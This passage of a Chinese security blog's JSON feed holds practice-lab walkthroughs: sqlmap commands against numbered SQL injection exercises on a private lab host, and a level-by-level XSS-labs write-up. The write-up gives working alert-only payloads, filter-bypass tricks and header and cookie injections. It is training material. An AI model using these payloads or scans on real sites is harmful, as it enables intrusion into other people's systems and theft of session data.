            "content_html": "<h1 id=\"sqlmap基础使用\"><a href=\"#sqlmap基础使用\" class=\"headerlink\" title=\"sqlmap基础使用\"></a>sqlmap基础使用</h1><h2 id=\"第一关\"><a href=\"#第一关\" class=\"headerlink\" title=\"第一关\"></a>第一关</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python sqlmap.py -u &quot;http://192.168.100.155/sqli/example1.php?name=root&quot; --output-dir=&quot;E:\\Tool\\tool\\SQLmap\\output&quot; --batch --random-agent</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/02/web/sqlmap%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/image-20240501225539554.png\" alt=\"image-20240501225539554\"></p>\n<h2 id=\"第二关\"><a href=\"#第二关\" class=\"headerlink\" title=\"第二关\"></a>第二关</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python sqlmap.py -u &quot;http://192.168.100.155/sqli/example2.php?name=root&quot; --output-dir=&quot;E:\\Tool\\tool\\SQLmap\\output&quot; --batch --random-agent --tamper=space2comment -v</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/02/web/sqlmap%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/image-20240501225606261.png\" alt=\"image-20240501225606261\"></p>\n<h2 id=\"第三关\"><a href=\"#第三关\" class=\"headerlink\" title=\"第三关\"></a>第三关</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python sqlmap.py -u &quot;http://192.168.100.155/sqli/example3.php?name=root&quot; --output-dir=&quot;E:\\Tool\\tool\\SQLmap\\output&quot; --batch --random-agent --tamper=space2comment -v</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/02/web/sqlmap%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/image-20240501225717778.png\" alt=\"image-20240501225717778\"></p>\n<h2 id=\"第四关\"><a href=\"#第四关\" class=\"headerlink\" title=\"第四关\"></a>第四关</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python sqlmap.py -u &quot;http://192.168.100.155/sqli/example4.php?id=2&quot; --output-dir=&quot;E:\\Tool\\tool\\SQLmap\\output&quot; --batch --random-agent</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/02/web/sqlmap%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/image-20240501225952121.png\" alt=\"image-20240501225952121\"></p>\n<h2 id=\"第五关\"><a href=\"#第五关\" class=\"headerlink\" title=\"第五关\"></a>第五关</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python sqlmap.py -u &quot;http://192.168.100.155/sqli/example5.php?id=2&quot; --output-dir=&quot;E:\\Tool\\tool\\SQLmap\\output&quot; --batch --random-agent</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/02/web/sqlmap%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/image-20240501230040354.png\" alt=\"image-20240501230040354\"></p>\n<h2 id=\"第六关\"><a href=\"#第六关\" class=\"headerlink\" title=\"第六关\"></a>第六关</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"第七关\"><a href=\"#第七关\" class=\"headerlink\" title=\"第七关\"></a>第七关</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python sqlmap.py -u &quot;http://192.168.100.155/sqli/example7.php?id=2%0A&quot; --output-dir=&quot;E:\\Tool\\tool\\SQLmap\\output&quot; --random-agent --batch</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/02/web/sqlmap%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/image-20240501234453233.png\" alt=\"image-20240501234453233\"></p>\n<h2 id=\"第八关\"><a href=\"#第八关\" class=\"headerlink\" title=\"第八关\"></a>第八关</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python sqlmap.py -u &quot;http://192.168.100.155/sqli/example8.php?order=name&quot; --output-dir=&quot;E:\\Tool\\tool\\SQLmap\\output&quot; --random-agent --dbms=mysql --batch --level 4 --risk 3</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/02/web/sqlmap%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/image-20240501232909037.png\" alt=\"image-20240501232909037\"></p>\n<h2 id=\"第九关\"><a href=\"#第九关\" class=\"headerlink\" title=\"第九关\"></a>第九关</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python sqlmap.py -u &quot;http://192.168.100.155/sqli/example9.php?order=name&quot; --output-dir=&quot;E:\\Tool\\tool\\SQLmap\\output&quot; --random-agent --dbms=mysql --batch --level 5 --risk 3</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/02/web/sqlmap%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/image-20240501233326481.png\" alt=\"image-20240501233326481\"></p>\n",
            "tags": []
        },
        {
            "id": "https://w-sqrt7.github.io/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/",
            "url": "https://w-sqrt7.github.io/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/",
            "title": "XSS-labs通关记录",
            "date_published": "2024-05-01T05:32:35.376Z",
            "content_html": "<h1 id=\"xss-labs通关记录\"><a href=\"#xss-labs通关记录\" class=\"headerlink\" title=\"xss-labs通关记录\"></a>xss-labs通关记录</h1><h2 id=\"第一关\"><a href=\"#第一关\" class=\"headerlink\" title=\"第一关\"></a>第一关</h2><p>这一关没有做出任何的过滤，直接传入payload即可</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">127.0.0.1:90/xss-labs/level1.php?name=&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240430201556793.png\" alt=\"image-20240430201556793\"></p>\n<h2 id=\"第二关\"><a href=\"#第二关\" class=\"headerlink\" title=\"第二关\"></a>第二关</h2><p>先尝试直接传入payload，观察结果发现并没有成功，查看页面源代码，可以看到特殊符号被转义了，可通过传入value中内容，利用  “&gt;  进行语句闭合，执行payload</p>\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-30%20201732-1714479821209.png\" alt=\"屏幕截图 2024-04-30 201732\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;&gt; &lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt; &lt;&quot;</span><br><span class=\"line\">&quot;&gt; &lt;img src=&#x27;777&#x27; onerror=alert()&gt; &lt;&quot;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240430202725281.png\" alt=\"image-20240430202725281\"></p>\n<h2 id=\"第三关\"><a href=\"#第三关\" class=\"headerlink\" title=\"第三关\"></a>第三关</h2><p>还是先尝试上一关的手法并观察结果，发现传入的特殊符号同样是被转义，这一次连双引号也一起转义了</p>\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-30%20203304.png\" alt=\"屏幕截图 2024-04-30 203304\"></p>\n<p>查看一下源码，可以发现这一关的关键在于htmlspecialchars函数</p>\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240430203735322.png\" alt=\"image-20240430203735322\"></p>\n<p>使用htmlspecialchars函数把预定义的字符&amp;、”、 ’、&lt;、&gt;转换为HTML实体，防止浏览器将其作为HTML元素，但是默认是只编码双引号的，而且单引号无论如何都不转义。</p>\n<p>htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。</p>\n<p>预定义的字符是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">- &amp; （和号）成为 &amp;amp;</span><br><span class=\"line\">- &quot; （双引号）成为 &amp;quot;</span><br><span class=\"line\">- &#x27; （单引号）成为 &#x27;</span><br><span class=\"line\">- &lt; （小于）成为 &amp;lt;</span><br><span class=\"line\">- &gt; （大于）成为 &amp;gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>然后尝试绕过特殊符号就可以通关，这里需要用到onclick或者onfocus事件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27; onclick=&#x27;alert(7)</span><br><span class=\"line\">&#x27; onfocus=javascript:alert(7) &#x27;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240430204417225.png\" alt=\"image-20240430204417225\"></p>\n<h2 id=\"第四关\"><a href=\"#第四关\" class=\"headerlink\" title=\"第四关\"></a>第四关</h2><p>和上一关并没有太大的出入，只是单引号变为了双引号</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot; onclick=&quot;alert(7)</span><br><span class=\"line\">&quot; onfocus=javascript:alert(7) &quot;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240430204617420.png\" alt=\"image-20240430204617420\"></p>\n<h2 id=\"第五关\"><a href=\"#第五关\" class=\"headerlink\" title=\"第五关\"></a>第五关</h2><p>先尝试上一关payload，并观察页面源代码，可以看到on被过滤了，实际上还过滤了&lt;script ,并且对大小写进行了限制</p>\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-30%20205222.png\" alt=\"屏幕截图 2024-04-30 205222\"></p>\n<p>利用&lt;a&gt;标签进行绕过&lt;a href&#x3D;”<a href=\"https://www.baidu.com\">百度\\\">https://www.baidu.com&quot;&gt;百度\\</a></p>\n<p>href属性的意思是 当标签&lt;a&gt;被点击的时候，就会触发执行转跳，可以是转跳到一个网站，我们还可以触发执行一段js代码</p>\n<p>注意闭合问题，payload传入后点击’xxx’执行即可</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;&gt; &lt;a href=javascript:alert(7)&gt;xxx&lt;/a&gt; &lt;&quot;</span><br><span class=\"line\">&quot;&gt; &lt;iframe src=&quot;javascript:alert(7)&quot;&gt;&lt;/iframe&gt; &lt;&quot;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240430210412092.png\" alt=\"image-20240430210412092\"></p>\n<h2 id=\"第六关\"><a href=\"#第六关\" class=\"headerlink\" title=\"第六关\"></a>第六关</h2><p>这一关过滤了很多，但是并没有对大小写做出限制，可以尝试大小写绕过</p>\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240430210649780.png\" alt=\"image-20240430210649780\"></p>\n<p>尝试大小写绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;&gt; &lt;sCript&gt;alert(7)&lt;/sCript&gt; &lt;&quot;</span><br><span class=\"line\">&quot; Onfocus=javascript:alert(7) &quot;</span><br><span class=\"line\">&quot;&gt; &lt;a hRef=javascript:alert(7)&gt;x&lt;/a&gt; &lt;&quot;</span><br><span class=\"line\">&quot;&gt; &lt;a HrEf=&quot;javascript:alert(7)&quot;&gt;</span><br><span class=\"line\">&quot;&gt; &lt;iframe sRc=&quot;javascript:alert(7)&quot;&gt; &lt;/iframe&gt;</span><br><span class=\"line\">......</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240430210843884.png\" alt=\"image-20240430210843884\"></p>\n<h2 id=\"第七关\"><a href=\"#第七关\" class=\"headerlink\" title=\"第七关\"></a>第七关</h2><p>同样尝试上一关的payload并观察，可以理解他将传入的敏感的关键字给处理掉了</p>\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-30%20211042.png\" alt=\"屏幕截图 2024-04-30 211042\"></p>\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240430211719760.png\" alt=\"image-20240430211719760\"></p>\n<p>查看源码，观察过滤的内容，发现还可以利用img标签进行绕过，可以利用双写进行绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;&gt; &lt;scscriptript&gt;alert(7)&lt;/sscriptcript&gt; &lt;&quot;</span><br><span class=\"line\">&quot;&gt; &lt;a hrehreff=javasscriptcript:alert(7)&gt;xxx&lt;/a&gt; &lt;&quot;</span><br><span class=\"line\">&quot;&gt; &lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgpPC9zY3JpcHQ+&quot;&gt; &lt;&quot;</span><br><span class=\"line\">......</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240430211626186.png\" alt=\"image-20240430211626186\"></p>\n<h2 id=\"第八关\"><a href=\"#第八关\" class=\"headerlink\" title=\"第八关\"></a>第八关</h2><p>先尝试输入些东西，进行查看，发现传入的内容写入了两个地方</p>\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-05-01%20101245.png\" alt=\"屏幕截图 2024-05-01 101245\"></p>\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501101725242.png\" alt=\"image-20240501101725242\"></p>\n<p>过滤的关键字很多，但是我们能利用href的自动Unicode解码，插入一段js伪协议，点击链接执行即可</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">javascript:alert()</span><br><span class=\"line\">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#41;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501102011700.png\" alt=\"image-20240501102011700\"></p>\n<h2 id=\"第九关\"><a href=\"#第九关\" class=\"headerlink\" title=\"第九关\"></a>第九关</h2><p>在上一关的基础山又做出了要求，即传入的内容中必需有  http:&#x2F;&#x2F;  才可以</p>\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501102344500.png\" alt=\"image-20240501102344500\"></p>\n<p>基础方法同时，在后面加上 &#x2F;<em>http:&#x2F;&#x2F;</em>&#x2F;将传入的内容注释掉就能绕过且不影响payload正常执行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#41;/* http:// */</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501102629896.png\" alt=\"image-20240501102629896\"></p>\n<h2 id=\"第十关\"><a href=\"#第十关\" class=\"headerlink\" title=\"第十关\"></a>第十关</h2><p>通过url传入参数，观察页面源代码，可以看到，因为h2标签，传入keyword并没有任何作用，且input标签被隐藏掉了</p>\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-05-01%20103204.png\" alt=\"屏幕截图 2024-05-01 103204\"></p>\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501103633467.png\" alt=\"image-20240501103633467\"></p>\n<p>找到对应的input标签，修改其type值为text，将输入框显示处理</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?t_sort=&quot; onclick=&quot;alert(&#x27;xss&#x27;)&quot; type=&quot;text</span><br><span class=\"line\">?t_sort=&quot; onfocus=javascript:alert() type=&quot;text</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501104117538.png\" alt=\"image-20240501104117538\"></p>\n<h2 id=\"第十一关\"><a href=\"#第十一关\" class=\"headerlink\" title=\"第十一关\"></a>第十一关</h2><p>观察源码，可以看出关键点就在于referer头，以此来进行注入即可</p>\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-05-01%20104547.png\" alt=\"屏幕截图 2024-05-01 104547\"></p>\n<p>通过BP或者hackbar传入payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Referer: &quot; onfocus=javascript:alert() type=&quot;text</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-05-01%20105305.png\" alt=\"屏幕截图 2024-05-01 105305\"></p>\n<h2 id=\"第十二关\"><a href=\"#第十二关\" class=\"headerlink\" title=\"第十二关\"></a>第十二关</h2><p>这次先查看前端页面源代码，不难猜出这一关是UA头注入，和上一关没有太大的区别</p>\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-05-01%20110130.png\" alt=\"屏幕截图 2024-05-01 110130\"></p>\n<p>同样利用BP或hackbar传入payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">User-Agent: &quot; onfocus=javascript:alert() type=&quot;text</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-05-01%20110457.png\" alt=\"屏幕截图 2024-05-01 110457\"></p>\n<h2 id=\"第十三关\"><a href=\"#第十三关\" class=\"headerlink\" title=\"第十三关\"></a>第十三关</h2><p>同样的操作，观察代码，可以猜出来这一次是cookie注入</p>\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-05-01%20110648.png\" alt=\"屏幕截图 2024-05-01 110648\"></p>\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501111432088.png\" alt=\"image-20240501111432088\"></p>\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501112536081.png\" alt=\"image-20240501112536081\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Cookie: user=&quot; onfocus=javascript:alert() type=&quot;text</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501112620737.png\" alt=\"image-20240501112620737\"></p>\n<h2 id=\"第十四关\"><a href=\"#第十四关\" class=\"headerlink\" title=\"第十四关\"></a>第十四关</h2><p>这一关具体是个什么意思没动，但是他这个网站好像是寄掉了，不知道有没有影响</p>\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501113154561.png\" alt=\"image-20240501113154561\"></p>\n<p>看了一下网上的内容，说是这一关比较特殊，payload是一张图片马，考察了CTF中的杂项中隐写Exif隐藏信息</p>\n<h2 id=\"第十五关\"><a href=\"#第十五关\" class=\"headerlink\" title=\"第十五关\"></a>第十五关</h2><p>发现关键点为ng-include</p>\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-05-01%20123236.png\" alt=\"屏幕截图 2024-05-01 123236\"></p>\n<p>ng-include指令用于包含外部的 HTML 文件，包含的内容将作为指定元素的子节点。</p>\n<p>ng-include属性的值可以是一个表达式，返回一个文件名。默认情况下，包含的文件需要包含在同一个域名下。</p>\n<p>这里尝试包含第一关的内容</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?src=&#x27;level1.php?name=&lt;img src=1 onerror=alert(7)&gt;&#x27;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501123627808.png\" alt=\"image-20240501123627808\"></p>\n<h2 id=\"第十六关\"><a href=\"#第十六关\" class=\"headerlink\" title=\"第十六关\"></a>第十六关</h2><p>查看源码，发现过滤了空格</p>\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501123925887.png\" alt=\"image-20240501123925887\"></p>\n<p>尝试利用%0A绕过空格</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?keyword=&lt;svg%0Aonload=alert(7)&gt;</span><br><span class=\"line\">?keyword=&lt;img%0dsrc=1%0donerror=alert(7)&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501124129938.png\" alt=\"image-20240501124129938\"></p>\n<h2 id=\"第十七关\"><a href=\"#第十七关\" class=\"headerlink\" title=\"第十七关\"></a>第十七关</h2><p>embed标签可以理解为定义了一个区域，可以放图片、视频、音频等内容，但是呢相对于他们，embed标签打开不了文件的时候就会没有显示的区域在，他们就能有块错误的区域 </p>\n<p>embed标签，是用来嵌入图片的。可以用onclick或onmouseover绕过。因为这两个变量是互相拼接起来的，所以在输入arg02时在b之后加一个空格，当浏览器解析到b的时候就停止判断，然后将onclick或onmouseover看作另外一个属性。可绕过加载的swf文件</p>\n<p>注意火狐浏览器肯能不兼容，注意更换浏览器尝试</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?arg01=a&amp;arg02=aaa onmousemove=&#x27;alert(1)&#x27;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501125037463.png\" alt=\"image-20240501125037463\"></p>\n<h2 id=\"第十八关\"><a href=\"#第十八关\" class=\"headerlink\" title=\"第十八关\"></a>第十八关</h2><p>这一关和上一关基本上是一样的</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?arg01=a&amp;arg02=aaa onmousemove=alert(1)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501130406838.png\" alt=\"image-20240501130406838\"></p>\n<h2 id=\"第十九关\"><a href=\"#第十九关\" class=\"headerlink\" title=\"第十九关\"></a>第十九关</h2><p>这里无法继续使用前两关的payload，因为他利用双引号将其闭合掉了，没法绕出去了</p>\n<p>这一关用到的是flash xss</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?arg01=version&amp;arg02=&lt;a href=&quot;javascript:alert()&quot;&gt;here&lt;/a&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"第二十关\"><a href=\"#第二十关\" class=\"headerlink\" title=\"第二十关\"></a>第二十关</h2><p>这一关需要反编译的知识点</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?arg01=id&amp;arg02=\\%22))&#125;catch(e)&#123;&#125;if(!self.a)self.a=!alert(1)</span><br><span class=\"line\">?arg01=id&amp;arg02=xss\\&quot;))&#125;catch(e)&#123;alert(1)&#125;//%26width=123%26height=123</span><br></pre></td></tr></table></figure>\n\n\n\n<p>参考文章：</p>\n<p><a href=\"https://blog.csdn.net/l2872253606/article/details/125638898\">https://blog.csdn.net/l2872253606/article/details/125638898</a></p>\n<p><a href=\"https://www.freebuf.com/articles/web/338123.html\">https://www.freebuf.com/articles/web/338123.html</a></p>\n<p><a href=\"https://blog.csdn.net/u014029795/article/details/103213877\">https://blog.csdn.net/u014029795/article/details/103213877</a></p>\n<p><a href=\"https://blog.csdn.net/weixin_30702413/article/details/99326627\">https://blog.csdn.net/weixin_30702413/article/details/99326627</a></p>\n<p><a href=\"https://blog.csdn.net/u014029795/article/details/103217680\">https://blog.csdn.net/u014029795/article/details/103217680</a></p>\n",
            "tags": [
                "原创",
                "靶场",
                "xss-labs"
            ]
        },
        {
            "id": "https://w-sqrt7.github.io/2024/04/27/other/basic/Docker%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80%E8%AF%A6%E8%A7%A3/",
            "url": "https://w-sqrt7.github.io/2024/04/27/other/basic/Docker%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80%E8%AF%A6%E8%A7%A3/",
            "title": "Docker使用基础详解",
            "date_published": "2024-04-27T03:00:42.014Z",
